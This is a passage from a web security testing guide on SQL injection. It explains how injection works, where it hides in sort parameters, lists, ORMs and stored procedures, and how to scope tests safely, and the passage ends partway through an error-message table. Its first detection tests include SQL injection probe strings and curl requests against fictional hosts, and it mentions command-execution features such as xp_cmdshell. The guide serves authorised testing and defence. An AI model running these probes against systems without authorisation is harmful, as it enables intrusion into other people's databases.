---
title: "SQL Injection: Detection, Confirmation and Prevention"
date: 2026-11-15 20:00:00 +0000
subcategory: injection
summary: "Finding and safely confirming SQL injection: hidden injection points, error, boolean, time and OOB signals, second-order, ORM pitfalls and fixes."
refs: [WSTG-INJT-05, WSTG-INJT-14, v5.0.0-1.2.4, v5.0.0-2.2.1, v5.0.0-13.2.2, v5.0.0-16.5.1, "API10:2023", "A05:2025", CWE-89, CWE-564, CWE-943, CWE-209]
tags: [web, sql-injection, injection, orm, sqlmap, secure-coding]
---

This note is part of our [Web Application Security testing guide](/web/web-application-security-testing-guide/) and sits under [Injection](/web/web-injection-testing-guide/). It covers SQL injection (SQLi): user input that changes the structure of a SQL statement instead of being treated as a value inside it. WSTG tests it as `WSTG-INJT-05`, with database-specific sub-pages for Oracle, MySQL, SQL Server, PostgreSQL and MS Access and a sub-page on ORM injection; the stored, fires-later variant falls under incubated vulnerabilities (`WSTG-INJT-14`). The bug is decades old, and you still find it. These days it rarely sits in `?id=1`. It shows up in sort parameters, IN lists built by hand, report builders, JSON filters, GraphQL arguments, headers that end up in analytics tables, and the "raw" escape hatches of ORMs. You get the model (where a query is built and why binding works), the places that still produce findings, twelve tests that stop at the least invasive proof (an error difference, a true/false pair, a short delay, an out-of-band DNS lookup, or the version banner and current user), sqlmap settings for confirmation only, and fixes in Node.js, Django, Spring and Laravel, including what to do with identifiers that cannot be parameterised. NoSQL databases are covered in [NoSQL injection](/web/web-nosql-injection/); when an injected database can run operating-system commands, the escalation side belongs with [OS command injection](/web/web-os-command-injection/), and we only describe it here.

## Contents

- [How it works](#how-it-works)
  - [How a query is built and where it breaks](#how-a-query-is-built-and-where-it-breaks)
  - [Injection contexts](#injection-contexts)
  - [Where SQL input arrives](#where-sql-input-arrives)
  - [Why parameterisation works and where it cannot be used](#why-parameterisation-works-and-where-it-cannot-be-used)
  - [What the database account decides](#what-the-database-account-decides)
- [What goes wrong](#what-goes-wrong)
  - [String concatenation and formatting](#string-concatenation-and-formatting)
  - [Identifiers and keywords that cannot be bound](#identifiers-and-keywords-that-cannot-be-bound)
  - [Lists, filters and dynamic WHERE builders](#lists-filters-and-dynamic-where-builders)
  - [ORM and query-builder escape hatches](#orm-and-query-builder-escape-hatches)
  - [Stored procedures that build dynamic SQL](#stored-procedures-that-build-dynamic-sql)
  - [Second-order injection](#second-order-injection)
  - [Nested and encoded inputs](#nested-and-encoded-inputs)
  - [Verbose database errors](#verbose-database-errors)
  - [Wildcards in parameterised LIKE queries](#wildcards-in-parameterised-like-queries)
- [Testing](#testing)
  - [Before you start](#before-you-start)
  - [Signals and false positives](#signals-and-false-positives)
  - [GT-WEB-SQLI-1: Map database-backed inputs and injection points](#gt-web-sqli-1-map-database-backed-inputs-and-injection-points)
  - [GT-WEB-SQLI-2: Error-based detection with syntax probes](#gt-web-sqli-2-error-based-detection-with-syntax-probes)
  - [GT-WEB-SQLI-3: Boolean-based detection with true and false pairs](#gt-web-sqli-3-boolean-based-detection-with-true-and-false-pairs)
  - [GT-WEB-SQLI-4: Time-based detection with bounded delays](#gt-web-sqli-4-time-based-detection-with-bounded-delays)
  - [GT-WEB-SQLI-5: Out-of-band detection with a collaborator you control](#gt-web-sqli-5-out-of-band-detection-with-a-collaborator-you-control)
  - [GT-WEB-SQLI-6: Fingerprint the database and confirm version and current user](#gt-web-sqli-6-fingerprint-the-database-and-confirm-version-and-current-user)
  - [GT-WEB-SQLI-7: ORDER BY, column, table and LIMIT injection](#gt-web-sqli-7-order-by-column-table-and-limit-injection)
  - [GT-WEB-SQLI-8: IN lists, search filters and LIKE wildcards](#gt-web-sqli-8-in-lists-search-filters-and-like-wildcards)
  - [GT-WEB-SQLI-9: JSON bodies, encoded payloads, headers, cookies and GraphQL arguments](#gt-web-sqli-9-json-bodies-encoded-payloads-headers-cookies-and-graphql-arguments)
  - [GT-WEB-SQLI-10: Second-order injection](#gt-web-sqli-10-second-order-injection)
  - [GT-WEB-SQLI-11: ORM, query-builder and stored-procedure review](#gt-web-sqli-11-orm-query-builder-and-stored-procedure-review)
  - [GT-WEB-SQLI-12: Confirm with sqlmap on conservative settings](#gt-web-sqli-12-confirm-with-sqlmap-on-conservative-settings)
- [Secure implementation](#secure-implementation)
  - [Design rules](#design-rules)
  - [Node.js](#nodejs)
  - [Django](#django)
  - [Spring and Java](#spring-and-java)
  - [Laravel and PHP](#laravel-and-php)
  - [Identifiers: allow-lists instead of parameters](#identifiers-allow-lists-instead-of-parameters)
  - [Stored procedures](#stored-procedures)
  - [Database account and error handling](#database-account-and-error-handling)
  - [Static analysis](#static-analysis)
  - [Regression tests](#regression-tests)
- [Practice labs](#practice-labs)
- [Real-world cases](#real-world-cases)
- [Rating findings](#rating-findings)
- [Mapping](#mapping)
- [References](#references)

## How it works

### How a query is built and where it breaks

An application talks to a relational database by sending it SQL text. The database parses that text into a structure (which tables, which columns, which conditions, which clauses), plans it, and runs it. SQL injection happens when user input becomes part of the **text the parser sees**, so that input can change the structure and not only fill in a value.

Take a product search written by concatenation:

```javascript
// Vulnerable: input becomes SQL text
const sql = "SELECT id, name, price FROM products WHERE category = '" + req.query.category + "' AND visible = 1";
```

With `category=gifts` the database parses `WHERE category = 'gifts' AND visible = 1`. With `category=gifts'` it sees an unterminated string and throws a syntax error. With `category=gifts' AND '1'='2` the WHERE clause gains a condition the developer never wrote, and the result set empties. Each of those differences is a detection signal, and each is harmless. With other inputs the same flaw lets a caller read other tables, change rows, or (with a privileged account on some engines) reach the file system and the operating system. That range is why the finding is serious even when you only proved the first step.

WSTG-INJT-05 sorts the outcomes by how the result comes back to you:

| Class | How you observe it | Typical proof in this note |
|---|---|---|
| **In-band, error-based** | The database error (or data inside it) appears in the response | A syntax error appears for `'` and disappears for `''` |
| **In-band, UNION-based** | Rows from your own `SELECT` are appended to the page | The version banner and current user in a column the page displays |
| **Blind, boolean-based** | The page differs between a true and a false condition | `AND 1=1` returns the normal page, `AND 1=2` returns the empty one |
| **Blind, time-based** | Response time depends on an injected delay | A 3-second delay that scales to 6 seconds when you double it |
| **Out-of-band (OAST)** | The database contacts a host you control | A DNS lookup of your collaborator subdomain from the database host |

### Injection contexts

Where in the statement the input lands decides which probes work. Find the context before you pick payloads; most false negatives come from testing a string context with numeric payloads or the other way round.

| Context | Example fragment | What breaks it | What confirms it |
|---|---|---|---|
| String literal | `WHERE name = '<input>'` | A lone `'` | `''` restores normal behaviour; a concatenation such as `ab'+'c` (SQL Server) behaves like `abc` |
| Numeric literal | `WHERE id = <input>` | A letter (`1002x`) | `1003-1` behaves like `1002` |
| Identifier | `ORDER BY <input>`, `FROM <input>` | A column that does not exist | Two valid columns give different orders; a `CASE` expression switches between them |
| Keyword | `ORDER BY price <input>` (direction) | Anything other than `ASC`/`DESC` | `ASC` vs `DESC` vs `ASC, name` |
| List | `WHERE id IN (<input>)` | A trailing `)` | `1,2` vs `1,2) AND (1=1` vs `1,2) AND (1=2` |
| LIKE pattern | `WHERE name LIKE '%<input>%'` | A lone `'` | Same string tests as above, plus `%` and `_` as wildcards |
| `LIMIT` / `OFFSET` | `LIMIT <input>` | A letter | Engine-dependent: PostgreSQL accepts expressions there, MySQL only constants |
| Inside a stored procedure | `EXEC('SELECT … ' + @param)` | Same as the inner context | Same as the inner context, one level removed |

Statement type matters as much as position. Most injection is in `SELECT … WHERE`, but PortSwigger's topic page lists the other common spots: `UPDATE` (in the values or the WHERE clause), `INSERT` (in the inserted values), `SELECT` (in table or column names), and `ORDER BY`. An injection inside `UPDATE … WHERE` or `DELETE … WHERE` is the reason this note forbids `OR`-based payloads: `OR 1=1` there changes or deletes every row.

### Where SQL input arrives

Treat every value the server might put into a query as a candidate, wherever it sits in the request:

| Location | Examples | Why it gets missed |
|---|---|---|
| Path and query string | `/api/products/1002`, `?category=gifts&sort=price&dir=asc&limit=20` | Sort, direction and paging parameters are "not user data" to developers |
| Form and JSON bodies | `{"filter": {"status": "open"}, "ids": [1, 2]}` | Nested keys and arrays reach dynamic query builders |
| JSON keys, not just values | `{"filter": {"created_at": "2026-01-01"} }` where the key becomes a column name | Developers parameterise values and forget that keys are identifiers |
| Headers | `User-Agent`, `Referer`, `X-Forwarded-For`, `Accept-Language`, `Authorization: Bearer …`, custom `X-Tenant` | Logged to analytics or audit tables, or used to look up tokens and tenants |
| Cookies | `TrackingId=…`, `lang=en`, `cart=…`, `last_store=12` | Non-session cookies are read server-side without validation |
| GraphQL arguments | `products(filter: "…", orderBy: "…")` | GraphQL validates types, not content; a `String` argument is any string |
| Values encoded inside parameters | base64 JSON in `?p=…`, URL-encoded JSON in a cookie, XML in a form field or upload | Scanners and filters see the outer encoding, the database sees the decoded value |
| Stored data used later | display names, addresses, file names, imported CSV rows, third-party API data | Second-order: safe on write, concatenated on a later read |
| Batch and asynchronous paths | exports, report schedulers, search indexers, nightly jobs | The vulnerable query runs outside the request you sent |

### Why parameterisation works and where it cannot be used

A parameterised query (prepared statement, bound parameter) sends the SQL text and the values separately. The text contains placeholders (`?`, `$1`, `:name`, `%s` in Python DB-API drivers); the driver passes the values as data. The structure is fixed before any input is considered, so no value can turn into syntax. This is the primary defence in the OWASP SQL Injection Prevention Cheat Sheet and what ASVS `v5.0.0-1.2.4` (L1) requires: database queries use parameterised queries, ORMs or entity frameworks, or are otherwise protected, explicitly including HQL and stored procedures.

Two things to keep in mind when you test or review:

- **Some drivers emulate binding.** PHP PDO with emulated prepares, and Sequelize `replacements`, escape the values and splice them into the text client-side. Done by a mature library this is still safe in practice, but it is escaping, not separation, and character-set mismatches have broken it historically. When you see emulation, check the connection character set and library version.
- **Placeholders stand for values only.** You cannot bind a table name, column name, `ASC`/`DESC`, an operator or a whole `IN (…)` list as one parameter. Laravel's documentation says it plainly: PDO does not support binding column names, so user input must never choose column names, including `order by` columns. The cheat sheet's answer is to map such choices to a fixed allow-list of application-owned values, which ASVS `v5.0.0-2.2.1` (L1, positive validation against an allow-list) supports. Every identifier position in a query is therefore a place where developers fall back to concatenation, which is why tests 7 and 8 exist.

Escaping by hand is not a defence. The cheat sheet now labels manual escaping "strongly discouraged": quoting rules differ by dialect and by server settings (MySQL's `NO_BACKSLASH_ESCAPES`, for example), and an escape function only protects string literals, not numeric or identifier contexts.

### What the database account decides

The injected SQL runs with the privileges of the application's database account. That account decides the severity more than the injection technique does:

- A **read-only account limited to the application schema** caps the impact at reading what the application can read (often still everything that matters).
- An account that **owns the schema** can modify and delete data and alter tables.
- A **superuser or DBA** account may reach engine features that touch the server itself: reading or writing files (`LOAD_FILE` and `INTO OUTFILE` on MySQL with the `FILE` privilege, `pg_read_file` and `COPY` on PostgreSQL), running commands (`xp_cmdshell` on SQL Server, `COPY … TO PROGRAM` on PostgreSQL), or making network connections. WSTG's database sub-pages document these. They are the reason a SQLi finding can be rated with **Scope Changed**, and they are **out of scope** for testing in this note: you describe the potential in the report, you do not demonstrate it.

ASVS `v5.0.0-13.2.2` (L2) asks for backend connections, including to data layers, to use accounts with the least necessary privileges. Ask the client what the application account can do instead of probing for it; the answer goes straight into the [rating](#rating-findings).

## What goes wrong

### String concatenation and formatting

**What happens:** the query is assembled with `+`, template literals, f-strings, `String.format`, `sprintf` or `"%s" % value`, and the result goes to `execute()`. A common half-fix is to pass the formatted string to a function that *supports* parameters without actually using them: `cursor.execute(f"… WHERE id = {pk}")` or `jdbcTemplate.queryForList("… WHERE id = " + id)`.

**Why it matters:** it is the classic flaw and still the most common one in code that has grown around an ORM: reporting endpoints, admin tools, migrations turned into features, quick fixes for performance.

**Where to look:** search, reporting and export features; admin panels; legacy endpoints next to a new API; anything that talks to the database through a low-level driver rather than the ORM. The FortiWeb case in [Real-world cases](#real-world-cases) was an `snprintf` of a bearer token into a `SELECT`.

### Identifiers and keywords that cannot be bound

**What happens:** the developer used placeholders for values, then needed a dynamic column for sorting (`ORDER BY ${sort} ${dir}`), a dynamic table for multi-tenant or archive tables (`FROM orders_${year}`), or a user-chosen column list for a report. Placeholders cannot do this, so the value is concatenated, sometimes "validated" with a regex that permits more than it should.

**Why it matters:** `ORDER BY` injection is fully exploitable through `CASE` expressions and subqueries, even though UNION does not work there. Scanners often miss it because the page looks the same with most probes; only the order changes.

**Where to look:** `sort`, `order`, `orderBy`, `sortField`, `dir`, `direction`, `columns`, `fields`, `groupBy`, `table`, `report`, `view`, `limit`, `offset`, `page_size` parameters; data-grid components in admin UIs that send column names; GraphQL `orderBy` arguments typed as `String` instead of an enum.

### Lists, filters and dynamic WHERE builders

**What happens:** an endpoint accepts a list (`?ids=1,2,3`, `ids[]=1&ids[]=2`, `{"ids": [1, 2]}`) and builds `IN (` + `ids.join(",")` + `)` because "you cannot bind a list". Or a filter object (`{"status": "open", "owner": 7}`) is turned into `WHERE key = value AND …` with keys taken from the request. Or an "advanced search" builds operators from input (`{"price": {"op": ">", "value": 10} }`).

**Why it matters:** lists and filter builders are where hand-written SQL survives inside otherwise parameterised code. Valve's `countryFilter[]` report in [Real-world cases](#real-world-cases) was an array parameter on a reporting page.

**Where to look:** bulk actions, export endpoints, dashboards, faceted search, any API with a generic `filter` or `where` parameter, and helper functions named `buildWhere`, `applyFilters`, `toSql`.

### ORM and query-builder escape hatches

ORMs parameterise what they generate. Every ORM also offers a way to write SQL yourself, and that is where findings come from. WSTG's ORM injection page makes the same point: from the tester's side it looks like ordinary SQLi, but the flaw is in how the ORM layer is used (or, less often, in the ORM itself).

| Stack | Escape hatch | Safe form | Unsafe form |
|---|---|---|---|
| Django | `raw()`, `cursor.execute()`, `RawSQL`, `.extra()` | `Person.objects.raw("… WHERE last_name = %s", [name])` | `raw(f"… WHERE last_name = '{name}'")`, or quoting the placeholder: `'%s'` |
| SQLAlchemy | `text()` | `text("… WHERE id = :id")` with `{"id": pk}` | `text(f"… WHERE id = {pk}")` |
| Hibernate / JPA | HQL/JPQL strings, `createNativeQuery` | `createQuery("from Order o where o.id = :id").setParameter("id", id)` | `createQuery("from Order o where o.id = " + id)` |
| Spring Data JPA | `@Query`, `Sort`, `JpaSort.unsafe` | Named parameters; `Sort.by` on validated properties | Concatenated native queries; user input passed to `JpaSort.unsafe` |
| Sequelize | `sequelize.query`, `sequelize.literal`, `Sequelize.fn`/`col` with raw input | `query(sql, { replacements: [...] })` or `{ bind: [...] }` | Template literals in `query()`; user input in `literal()` or in `order: [[req.query.sort, ...]]` without an allow-list |
| Knex | `knex.raw`, `whereRaw`, `orderByRaw`, `joinRaw` | `whereRaw("price > ?", [min])`; `??` for identifiers | ``whereRaw(`price > ${min}`)`` |
| Prisma | `$queryRaw`, `$queryRawUnsafe`, `$executeRawUnsafe`, `Prisma.raw` | `$queryRaw` as a tagged template (values become parameters) | `$queryRawUnsafe` with interpolated input; `Prisma.raw(userInput)` |
| TypeORM | `query()`, QueryBuilder `.where()` strings, `.orderBy()` | `.where("u.name = :name", { name })` | ``.where(`u.name = '${name}'`)``, user input in `.orderBy()` |
| Laravel | `DB::raw`, `whereRaw`, `selectRaw`, `orderByRaw`, `havingRaw`, `DB::select` | `whereRaw('price > ?', [$min])` | `whereRaw("price > $min")`; `orderBy($request->sort)` without an allow-list |
| Eloquent / query builder column arguments | `orderBy($col)`, `where($col, …)`, `select($cols)` | Column from an allow-list | Column taken from the request |

Three patterns produce most ORM findings:

1. **Raw fragments with interpolation.** The safe API and the unsafe API look almost the same: `whereRaw("x = ?", [v])` versus `whereRaw("x = " + v)`; `$queryRaw` (tagged template) versus `$queryRawUnsafe` (plain string). Reviewers skim past them.
2. **Identifiers passed straight through.** Many builders quote identifiers, but quoting only keeps the syntax valid; it does not stop a caller choosing a column the application never meant to expose (sorting or filtering by `password_hash` is an oracle). The SQL Injection Prevention Cheat Sheet makes this point about identifier quoting in stored procedures, and it applies equally here.
3. **HQL and JPQL concatenation.** HQL looks object-oriented, so developers forget it is a query language. CWE-564 (*Use of Hibernate with HQL/SQL Query String Containing External Input* in CWE 5.0) exists for exactly this; its examples include HQL injection through `ORDER BY` and sort columns. HQL is translated to SQL, so not every SQL construct survives, but the research linked from WSTG's ORM page (SonarSource's *Exploiting Hibernate Injections*) shows that it is usually exploitable.

`.extra()` deserves a special mention: Django's documentation calls it an old API it aims to deprecate and asks you to use it only as a last resort. Any `.extra(where=[…])` built with formatting is a finding candidate, and its presence at all is worth a review comment.

### Stored procedures that build dynamic SQL

**What happens:** the application calls a stored procedure with bound parameters, which is safe, but the procedure concatenates those parameters into a string and runs it with `EXEC(@sql)` (SQL Server), `EXECUTE` (PL/pgSQL) or `EXECUTE IMMEDIATE` (Oracle PL/SQL). WSTG's example is a reporting procedure that takes a column list and builds `SELECT ' + @columnamelist + ' FROM ReportTable`.

**Why it matters:** "we only use stored procedures" is often offered as proof of safety. The SQL Injection Prevention Cheat Sheet is explicit that binding procedure arguments protects the call, not dynamic SQL built inside the procedure.

**Where to look:** report generators, search procedures with optional filters, procedures that take a table or column name, and any T-SQL containing `EXEC(` or `sp_executesql` with a concatenated first argument. From the outside it looks like ordinary SQLi; the fix is in the database code, see [Stored procedures](#stored-procedures).

### Second-order injection

**What happens:** input is stored safely (parameterised `INSERT`), then read back later and concatenated into a different query. PortSwigger's definition: the application stores the input for future use and incorporates it unsafely when handling a later request. WSTG treats the general pattern (planted now, triggered later) as an incubated vulnerability, `WSTG-INJT-14`. Typical triggers: a username used in a "change password" query, a saved search re-run by a scheduler, a display name used in a report or export, a filename used in an audit query, data imported from CSV or a partner API.

**Why it matters:** testing the write request shows nothing; the payload fires in another request, another user's session, or a batch job, often with a more privileged account. The OWASP API Security Top 10 uses this shape in `API10:2023` (Unsafe Consumption of APIs): an attacker stores a SQLi payload in a third-party service, the API consumes the third party's data and builds a query from it.

**Where to look:** any stored value that later drives a query: profile fields, saved filters, report definitions, tags, webhook and integration names, uploaded file metadata, and data from integrations the application treats as trusted.

### Nested and encoded inputs

**What happens:** the injectable value is not a plain parameter. It is a field inside base64-encoded JSON in a query parameter (the Uber case in [Real-world cases](#real-world-cases)), a node inside an XML document posted to a web service (the Starbucks case), a property inside a JSON cookie, or a GraphQL argument inside a POST body. The application decodes it and builds the query from the decoded field.

**Why it matters:** scanners and WAFs often inspect only the outer layer. ASVS `v5.0.0-1.1.1` (L2) is relevant in the other direction: decode once, and validate after decoding, not before.

**Where to look:** parameters whose values look like base64 (`ey…`-prefixed values are base64 JSON objects), hex, URL-encoded JSON; SOAP and XML endpoints; file uploads that are parsed (CSV, XML, spreadsheet imports); GraphQL.

### Verbose database errors

**What happens:** the application returns the driver's exception text, a stack trace, or the failed query itself. Frameworks in debug mode do this by default.

**Why it matters:** on its own, a verbose error is an information-disclosure finding (CWE-209; ASVS `v5.0.0-16.5.1`, L2, requires a generic message for unexpected errors). Next to an injection it makes exploitation trivial: error-based extraction becomes possible and the error usually names the engine, the table and the query shape. Report both; fixing the error page does not fix the injection.

**Where to look:** responses to a single `'` or a type-mismatched value; JSON error bodies (`"detail"`, `"message"`, `"trace"`); HTML comments; framework debug pages.

### Wildcards in parameterised LIKE queries

**What happens:** the query is parameterised, `WHERE code LIKE ?`, but the value is not escaped for LIKE, so `%` and `_` act as wildcards. WSTG's example is a discount-code check that accepts `%`.

**Why it matters:** this is not SQL injection (the structure is fixed), but it can be a real finding: matching every discount code, confirming secrets one character at a time (`a%`, `ab%`), or causing expensive scans with patterns such as `%_%_%_%`. CWE-155 (*Improper Neutralization of Wildcards or Matching Symbols*) fits it better than CWE-89.

**Where to look:** lookups that should be exact matches (codes, tokens, email addresses) but use `LIKE` or `ILIKE`; search boxes on large tables.

## Testing

Everything below assumes an **authorised** engagement with written scope and rules of engagement, a bug bounty programme whose rules allow injection testing, or a deliberately vulnerable lab. Requests and responses in this note are **illustrative**: hosts are fictional and outputs are shortened.

### Before you start

**Confirm the scope in writing.** SQL injection tests talk to the client's database, so agree the following before the first quote character:

| Item | What to agree |
|---|---|
| Targets | Hosts and API base paths in scope; whether production is in scope or a production-like staging copy is available (prefer staging for time-based and automated tests) |
| Techniques | Error, boolean, time-based and out-of-band probes; whether automated tools (Burp Scanner active scans, sqlmap) are allowed, and on which hosts |
| Proof level | Our default: stop at an error toggle, a boolean pair, a bounded delay, an OOB DNS lookup, or the version banner and current user/database name. Never table contents |
| Write paths | Whether endpoints that `INSERT`, `UPDATE` or `DELETE` may be probed, and only with your own test records |
| Windows and contacts | Testing hours, an emergency contact, and how to report a Critical immediately (an unauthenticated SQLi on an internet-facing host should not wait for the final report) |
| Background | The database engine, ORM and the privileges of the application's database account, if the client will share them; a grey-box test with source or query logs finds more with fewer requests |

**Proxy.** One Burp project per engagement with the target scope set; Logger on so every request is kept; Repeater for manual probes (its status bar shows the response time, which you need for test 4); Comparer for boolean pairs. Install **Param Miner** (hidden parameters and headers), **InQL** (GraphQL schemas) and optionally **Backslash Powered Scanner** (it looks for input that is interpreted rather than reflected, and finds odd contexts manual testers miss). If you run Burp Scanner, give it a resource pool with one concurrent request and a delay, and scope it to the requests you choose rather than letting it crawl.

**A collaborator you control.** Out-of-band tests need a DNS and HTTP listener whose interactions only you can see: **Burp Collaborator** (Burp Suite Professional) or a self-hosted **interactsh** server. Rules: one unique subdomain per test so you can tie an interaction to a request; the hostname carries a static marker only, never the result of a query (putting data into DNS names is exfiltration and out of scope); DNS and HTTP only, no SMB listener (an SMB connection from a Windows database host can hand over the service account's NTLM challenge-response, which you have no business collecting). This note writes the collaborator host as `<id>.oob.example.org`; replace it with your own.

**Safe-proof rules.**

- Prefer `AND` over `OR`. `OR 1=1` changes the meaning of the whole WHERE clause; in an `UPDATE` or `DELETE` it touches every row, and in a login query it can sign you in as the first user in the table (usually an administrator). sqlmap's own documentation gives the `UPDATE` example as the reason its `OR` payloads sit at the highest risk level.
- No statement that writes or changes state: no `DROP`, `UPDATE`, `DELETE`, `INSERT`, stacked writes, `INTO OUTFILE`, file reads or writes, `xp_cmdshell` or any `sp_configure` change, `COPY … TO PROGRAM`, `CREATE FUNCTION`.
- No dumping. The deepest you go is the version banner and the current user and database name (test 6). If you need to show impact beyond that, describe it with the account's privileges in the report.
- Delays of a few seconds (3 is plenty), never heavy functions. MySQL's `BENCHMARK()`, Cartesian joins and "heavy queries" create real CPU load on a shared production database. A sleep placed in a WHERE or ORDER BY clause can also run once per row the engine evaluates, so a 3-second payload can hold a connection for minutes; wrap it in a scalar subquery or use a filter that matches a single row.
- Payloads in requests that write (profile updates, comments, sign-ups) affect stored data. Use only your own records, keep the payload inert (an error toggle, a short delay), and restore the field afterwards.

**Request-rate limits.** Manual testing at one or two requests per second is a sensible default unless the rules say otherwise. Automated tools: one thread and at least a one-second delay between requests (`--threads 1 --delay 1` in sqlmap; a resource pool in Burp). Time-based tests: at most a handful of delayed requests per parameter, interleaved with zero-delay controls.

**Stop rules.**

- Stop testing a parameter once you have one confirmed signal plus its control; more requests add risk, not evidence.
- Stop everything and contact the client if error rates or response times climb across the application, if accounts lock, or if you trigger monitoring they asked you to avoid.
- If any response shows real data that is not yours (another customer's record in a UNION result, a row from an unexpected table), stop that line, keep only the minimum redacted evidence (endpoint, status, a masked field), do not request more, and report it immediately.
- If a probe shows you are inside a write statement you did not expect (an `INSERT` error, a duplicate row), stop probing that parameter with anything but a time-based or error toggle and tell the client.

### Signals and false positives

Every detection technique compares two responses. Before you call anything SQLi, rule out the usual impostors:

| Impostor | What it looks like | How to tell |
|---|---|---|
| **WAF or filter block** | `403`, a vendor block page, a reference ID, a connection reset after `'` or `UNION` | The block appears for the payload and for harmless strings with the same keyword; it never toggles with quote balancing (`'` blocked, `''` also blocked). A WAF reaction is a fact about the WAF, not the application |
| **Generic `500` from input parsing** | `1002'` returns `500` | Application code failed to parse an integer before any SQL ran. In a string context, `'` errors and `''` must not; if both error, it is validation. In a numeric context, try `1003-1` |
| **Lenient type coercion** | `1002 AND 1=2` returns order 1002 | `parseInt("1002 AND 1=2")` in JavaScript and `(int)"1002abc"` in PHP both return 1002. The suffix was discarded, not evaluated. `1003-1` returning order 1003 confirms coercion |
| **Caching** | The false condition returns the "true" page, or a delay disappears | `Age`, `X-Cache: HIT`, `CF-Cache-Status: HIT`; add a cache-busting parameter and repeat |
| **Rate limiting and throttling** | Later requests are slower or return `429` | The delay does not scale with the injected value and appears for controls too; space requests out and alternate payload and control |
| **Network and platform jitter** | One slow response | Cold starts (serverless), connection-pool waits and garbage collection. Require the delay to be repeatable and proportional (3 s → about 3 s, 6 s → about 6 s, 0 s → baseline) |
| **Reflected input in a validation message** | `Invalid value: gifts'` | The application echoed you; there is no database error text |
| **Search engines and other parsers** | Syntax errors from Elasticsearch, Solr or a Lucene query parser | A query-language error, not SQL. Still a finding to follow up (query-string injection), see [NoSQL injection](/web/web-nosql-injection/) |
| **Tokenising search** | `gifts'` returns the same as `gifts` | Full-text search strips punctuation; no difference does not prove safety, but it is not evidence of SQLi either |
| **OOB lookups by security tools** | A DNS interaction for your collaborator domain | Proxies, mail scanners and some IDS products resolve hostnames they see in traffic. Send the same hostname in a non-SQL context as a control; see test 5 |

### GT-WEB-SQLI-1: Map database-backed inputs and injection points

*Guler Tech methodology.* Implements the identification step of WSTG-INJT-05 (identify SQL injection points), using WSTG-INFO-06 (entry points) and, for GraphQL, WSTG-APIT-99.

#### What it checks

Which inputs probably reach a SQL query, in which context (string, number, identifier, list, LIKE pattern, stored for later), and in which encoding. The output is the work list for tests 2 to 11.

#### Prerequisites

A test account per role in scope; Burp Logger history of a full walk-through; API documentation (OpenAPI, Postman collection, GraphQL schema) if available.

#### Steps

1. Walk every feature with Logger on: search, filters, sorting and paging in every list, reports and exports, profile and settings, uploads and imports, admin screens in scope.
2. For each request, list every input: path segments, query parameters, body fields (including nested JSON keys and array elements), cookies, and headers the application might store or look up (`User-Agent`, `Referer`, `X-Forwarded-For`, `Authorization`, custom `X-*` headers).
3. Mark the probable context. Values that select records (`id`, `category`, `email`) are value contexts. Values that change *how* records are returned (`sort`, `dir`, `fields`, `group`, `limit`, `table`, `report`) are identifier or keyword contexts. Comma lists and arrays are list contexts. Free-text search is a LIKE or full-text context.
4. Decode anything that looks encoded: base64 (`ey…` is usually a JSON object), URL-encoded JSON, hex, XML inside form fields. Note whether a signature or MAC protects it; if tampering is rejected, the field is not attacker-controlled.
5. Run Param Miner on interesting endpoints to find unlinked parameters and headers. Pull additional endpoints and parameter names from JavaScript bundles and the mobile app.
6. For GraphQL, load the schema into InQL (or introspect, if enabled) and list every argument typed `String`, `JSON` or a custom scalar. Arguments typed as enums or `Int` are validated by the GraphQL layer; `String` arguments named `filter`, `where`, `orderBy`, `sort` or `search` are the leads.
7. List stored values that are likely to be reused later (display name, address, saved searches, report titles, file names, integration names); these feed test 10.
8. Note the technology: response headers, error pages, cookie names, framework conventions. They suggest the database and ORM before you send a single probe.

#### Observation

A work list like this (illustrative):

| Request | Input | Location | Context | Encoding | Notes |
|---|---|---|---|---|---|
| `GET /api/products` | `category` | query | string | none | Search page |
| `GET /api/products` | `sort`, `dir` | query | identifier, keyword | none | Data grid |
| `GET /api/orders/{id}` | `id` | path | number | none | |
| `POST /api/orders/bulk-export` | `ids` | JSON array | list | none | Export job, async |
| `GET /track` | `p` | query | string inside JSON | base64 JSON | `{"user_id": …}` |
| `POST /graphql` | `products(filter:)` | GraphQL argument | string | JSON body | `String` type |
| any | `TrackingId` | cookie | string | none | Analytics |
| `PUT /api/me` | `display_name` | JSON | stored | none | Shown in admin reports (test 10) |

#### Evaluation

No finding by itself. Verbose stack traces or query text seen during the walk-through are reported as information disclosure (CWE-209), rated by what they reveal.

#### False positives

Parameters that never reach a database (feature flags, client-side routing, values used only to call another API). If you have grey-box access, a query log shows which inputs reach SQL and removes guesswork.

#### Automation

Param Miner, InQL and Logger exports. In CI the equivalent is an inventory of query-building code (see [Static analysis](#static-analysis)): every raw SQL call site is a line on the work list.

### GT-WEB-SQLI-2: Error-based detection with syntax probes

*Guler Tech methodology.* Implements the detection techniques of WSTG-INJT-05 (single quote, comment and type-mismatch probes, and error-message fingerprinting), with the database-specific error texts from the WSTG Oracle, MySQL, SQL Server, PostgreSQL and MS Access sub-pages.

#### What it checks

Whether breaking and then repairing SQL syntax in an input changes the response in a way only a SQL parser explains.

#### Prerequisites

The work list from GT-WEB-SQLI-1; a baseline response for each input with a normal value.

#### Steps

1. Send the baseline and note status, length and a distinctive part of the body:

```http
GET /api/products?category=gifts HTTP/1.1
Host: app.example.com
Cookie: session=<SESSION_USER_A>
Accept: application/json
```

2. Change **one input at a time** (WSTG stresses this: vary one parameter, keep the rest constant) and send these probes. Each is a separate request:

```text
gifts'            unbalanced single quote
gifts''           balanced again: two quotes are an escaped quote inside a string
gifts"            double quote (some engines and identifier contexts)
gifts\            backslash: MySQL treats it as an escape character by default
1002x             letter in a numeric context
1002'             quote in a numeric context
```

3. If `'` breaks and `''` repairs, try string concatenation that should give back the original value. Use the operator of the engine you suspect (one line per engine):

```text
gif'||'ts         Oracle, PostgreSQL (and SQLite)
gif'+'ts          SQL Server
gif' 'ts          MySQL (adjacent string literals are joined)
```

4. Look at the whole response, not just the status: JSON error fields, HTML comments, response headers, and the page source (WSTG notes that errors are sometimes present but hidden).

```bash
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -b 'session=<SESSION_USER_A>' \
  "https://app.example.com/api/products?category=gifts%27"
```

#### Observation

Vulnerable (illustrative): `'` produces a database error, `''` returns the normal list, and `gif'||'ts` returns exactly the `gifts` results.

```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json

{"error":"ERROR: unterminated quoted string at or near \"'gifts'' AND visible = 1\""}
```

Error texts that identify the engine (WSTG sub-pages and common driver messages):

| Engine | Typical message fragment |
|---|---|
| MySQL / MariaDB | `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version` |
